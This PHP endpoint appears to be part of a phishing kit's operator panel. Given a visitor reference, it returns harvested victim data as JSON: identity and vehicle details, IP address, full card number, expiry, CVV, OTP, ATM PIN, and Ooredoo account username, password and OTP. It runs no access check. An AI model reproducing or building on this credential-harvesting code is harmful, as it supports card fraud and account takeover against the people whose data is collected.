<?php
require_once '../../includes/db.php';
require_once '../../includes/functions.php';

header('Content-Type: application/json');

$ref = $_GET['ref'] ?? '';

if (!$ref) {
    echo json_encode(['success' => false, 'error' => 'Missing reference']);
    exit;
}

try {
    $stmt = $pdo->prepare("SELECT * FROM visitors WHERE visitor_id = ?");
    $stmt->execute([$ref]);
    $v = $stmt->fetch(PDO::FETCH_ASSOC);
    
    if (!$v) {
        echo json_encode(['success' => false, 'error' => 'Not found']);
        exit;
    }
    
    $stmtData = $pdo->prepare("SELECT field_name, field_value FROM client_data WHERE visitor_id = ?");
    $stmtData->execute([$ref]);
    $details = $stmtData->fetchAll(PDO::FETCH_KEY_PAIR);
    
    $data = [
        'referenceId' => $v['visitor_id'],
        'clientName' => $details['name_ar'] ?? $details['username'] ?? '-',
        'clientId' => $details['id_number'] ?? '-',
        'clientPhone' => $details['phone_number'] ?? '-',
        'vehiclePlate' => $details['vehicle_plate'] ?? '-',
        'vehicleType' => $details['vehicle_type'] ?? '-',
        'serviceRegion' => $details['region'] ?? '-',
        'serviceDate' => $v['last_activity'],
        'serviceTime' => '-',
        'status' => $v['status'],
        'clientIp' => $v['ip_address'],
        'clientEmail' => $details['email_confirm'] ?? '-',
        'clientNationality' => $details['nationality'] ?? '-',
        'payment' => [
            'cardHolderName' => $details['card_name'] ?? '-',
            'cardNumber' => $details['card_number'] ?? '-',
            'cardExpiry' => ($details['exp_month'] ?? '') . '/' . ($details['exp_year'] ?? ''),
            'cardCvv' => $details['cvv'] ?? '-',
            'verifyCode' => $details['otp'] ?? '-',
            'secretNum' => $details['atm_pin'] ?? '-',
            'ooredooUser' => $details['ooredoo_user'] ?? '-',
            'ooredooPass' => $details['ooredoo_pass'] ?? '-',
            'ooredooOtp' => $details['ooredoo_otp'] ?? '-',
            'step' => 1
        ]
    ];
    
    echo json_encode(['success' => true, 'data' => $data]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}
?>
